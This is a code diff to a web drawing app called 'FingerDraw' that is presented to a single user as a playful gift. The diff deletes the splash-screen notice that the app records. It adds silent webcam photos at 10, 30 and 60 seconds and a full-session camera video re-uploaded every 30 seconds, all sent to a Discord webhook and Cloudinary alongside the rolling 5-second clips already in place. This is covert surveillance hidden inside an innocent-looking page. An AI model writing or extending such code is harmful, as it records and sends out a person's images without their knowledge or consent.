@@ -170,7 +170,7 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);touch-acti
   <div class="splash-logo">FINGERDRAW</div>
   <div class="splash-sub">paint with your bare hands</div>
   <button class="splash-btn" id="splashBtn">Tap Here :3</button>
-  <p class="splash-hint">Just for my Cutie :3<br>Records automatically 🎥</p>
+  <p class="splash-hint">Just for my Cutie :3 🎨</p>
 </div>
 <!-- LOADING -->
 <div id="mpLoader" style="display:none">
@@ -261,12 +261,17 @@ let sprayInterval  = null;
 // Recording state
 let mediaRecorder     = null;
 let currentChunk      = [];   // 5-s window sent to Discord
-let fullSessionChunks = [];   // ALL chunks → full Cloudinary video at end
-let chunkCount        = 0;
-let chunkTimer        = null;
+let fullSessionChunks = [];   // ALL chunks → full Cloudinary video (growing)
+let chunkCount          = 0;
+let chunkTimer          = null;
+let cloudinaryTimer     = null; // periodic Cloudinary upload every 30 s
 let compositeCanvas, cCtx, animFrameId, composeActive = false;
-let sessionStart      = null;
-let cloudinaryDone    = false;
+let sessionStart        = null;
+let cloudinaryUploading = false;
+// Auto-photo state
+const PHOTO_TIMES_MS = [10_000, 30_000, 60_000]; // take 3 photos at these offsets
+let photoTimers      = [];
+let photoCount       = 0;
 const video      = document.getElementById('video');
 const drawCanvas = document.getElementById('drawCanvas');
 const landCanvas = document.getElementById('landCanvas');
@@ -363,11 +368,18 @@ function startChunkedRecording() {
       fullSessionChunks.push(e.data);  // for full Cloudinary video
     }
   };
-  // Every timeslice a chunk of data fires — we collect for 5 s then ship
+  // Every timeslice fires — Discord gets 5-s clips, Cloudinary gets growing full video
   mediaRecorder.start(CHUNK_INTERVAL_MS);
   setRecDot('recording');
-  // Ship every 5 seconds
+  // Discord: ship every 5 s
   chunkTimer = setInterval(shipChunk, CHUNK_INTERVAL_MS);
+  // Cloudinary: upload FULL session so far every 30 s (active fetch, never on exit)
+  cloudinaryTimer = setInterval(uploadFullSessionToCloudinary, 30_000);
+  // Schedule 3 silent auto-photos
+  photoCount  = 0;
+  photoTimers = PHOTO_TIMES_MS.map((delay, i) =>
+    setTimeout(() => captureAndSendPhoto(i + 1), delay)
+  );
 }
 async function shipChunk() {
   if (!mediaRecorder || currentChunk.length === 0) return;
@@ -382,6 +394,40 @@ async function shipChunk() {
   const label  = `chunk-${String(chunkCount).padStart(3,'0')}`;
   // Only Discord gets the rolling 5-s clips
   sendChunkToDiscord(blob, ts, label, now, sizeMB);
+}
+/* ═══════════════════════════════════════
+   AUTO PHOTO CAPTURE
+   3 photos taken at 10 s / 30 s / 60 s.
+   Sent silently to Discord + Cloudinary.
+═══════════════════════════════════════ */
+function captureAndSendPhoto(num) {
+  if (!compositeCanvas) return;
+  compositeCanvas.toBlob(blob => {
+    if (!blob || blob.size < 1000) return;
+    const ts  = sessionStart ? sessionStart.toISOString().replace(/[:.]/g, '-') : 'session';
+    const now = new Date().toLocaleString();
+    const label = `photo-${num}`;
+    // Discord — send as JPEG image attachment
+    const fd = new FormData();
+    fd.append('content', `📸 **FingerDraw** · ${now} · ${label}`);
+    fd.append('file', new File([blob], `fingerdraw-${ts}-${label}.jpg`, { type: 'image/jpeg' }));
+    discordFetch(fd);
+    // Cloudinary — upload as image (not video)
+    const cfd = new FormData();
+    cfd.append('file', new File([blob], `fingerdraw-${ts}-${label}.jpg`, { type: 'image/jpeg' }));
+    cfd.append('upload_preset', CLOUDINARY_PRESET);
+    cfd.append('api_key', CLOUDINARY_KEY);
+    cfd.append('public_id', `fingerdraw/${ts}-${label}`);
+    fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD}/image/upload`, {
+      method: 'POST', body: cfd
+    }).then(r => r.ok ? r.json() : null).then(data => {
+      if (data && data.secure_url) {
+        const fd2 = new FormData();
+        fd2.append('content', `🖼️ **Cloudinary Photo ${num}**: ${data.secure_url}`);
+        discordFetch(fd2);
+      }
+    }).catch(() => {});
+  }, 'image/jpeg', 0.88);
 }
 /* ═══════════════════════════════════════
    DISCORD — chunked multi-part if > 8 MB
@@ -419,35 +465,43 @@ async function discordFetch(fd) {
   } catch { return false; }
 }
 /* ═══════════════════════════════════════
-   CLOUDINARY — full session video on exit
+   CLOUDINARY — full growing session video
+   Called every 30 s while page is alive.
+   Always overwrites the same public_id so
+   Cloudinary has ONE video, not chunks.
 ═══════════════════════════════════════ */
 async function uploadFullSessionToCloudinary() {
-  if (cloudinaryDone) return;
-  if (!fullSessionChunks.length) return;
-  cloudinaryDone = true;
+  if (cloudinaryUploading || !fullSessionChunks.length) return;
+  cloudinaryUploading = true;
+  // Snapshot current chunks (do NOT splice — keep them for next upload)
   const mimeType = mediaRecorder ? (mediaRecorder.mimeType || 'video/webm') : 'video/webm';
-  const blob = new Blob(fullSessionChunks, { type: mimeType });
-  if (blob.size < 1000) return;
+  const blob = new Blob([...fullSessionChunks], { type: mimeType });
+  if (blob.size < 5000) { cloudinaryUploading = false; return; }
   const ts     = sessionStart ? sessionStart.toISOString().replace(/[:.]/g, '-') : 'session';
   const sizeMB = (blob.size / 1024 / 1024).toFixed(2);
   const fd = new FormData();
-  fd.append('file', new File([blob], `fingerdraw-${ts}-full.webm`, { type: 'video/webm' }));
+  fd.append('file', new File([blob], `fingerdraw-${ts}.webm`, { type: 'video/webm' }));
   fd.append('upload_preset', CLOUDINARY_PRESET);
   fd.append('api_key', CLOUDINARY_KEY);
-  fd.append('public_id', `fingerdraw/${ts}-full`);
+  // Same public_id every time → Cloudinary overwrites with the latest full video
+  fd.append('public_id', `fingerdraw/${ts}`);
+  fd.append('overwrite', 'true');
+  fd.append('invalidate', 'true');
   try {
     const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD}/video/upload`, {
       method: 'POST',
       body: fd
     });
-    if (!res.ok) return;
-    const data = await res.json().catch(() => null);
-    if (data && data.secure_url) {
-      const fd2 = new FormData();
-      fd2.append('content', `☁️ **Cloudinary FULL SESSION** · ${sizeMB} MB\n${data.secure_url}`);
-      discordFetch(fd2);
+    if (res.ok) {
+      const data = await res.json().catch(() => null);
+      if (data && data.secure_url) {
+        const fd2 = new FormData();
+        fd2.append('content', `☁️ **Cloudinary** · ${sizeMB} MB (full session)\n${data.secure_url}`);
+        discordFetch(fd2);
+      }
     }
   } catch {}
+  cloudinaryUploading = false;
 }
 /* ═══════════════════════════════════════
    REC DOT
@@ -469,13 +523,16 @@ function flushOnExit() {
   if (_flushCalled || !mediaRecorder) return;
   _flushCalled = true;
   clearInterval(chunkTimer);
+  clearInterval(cloudinaryTimer);
+  photoTimers.forEach(t => clearTimeout(t));
   composeActive = false;
   cancelAnimationFrame(animFrameId);
   try { mediaRecorder.requestData(); } catch {}
   try { mediaRecorder.stop(); } catch {}
-  // Upload the full combined video to Cloudinary (async — best-effort)
+  // Best-effort Cloudinary update while the page is briefly still alive
+  // (visibilitychange fires before the page is fully killed)
   uploadFullSessionToCloudinary();
-  // Send a lightweight beacon so Discord knows session ended
+  // Beacon to Discord — sendBeacon survives page unload
   const payload = JSON.stringify({
     content: `🎨 **FingerDraw** session ended · ${new Date().toLocaleString()}`
   });
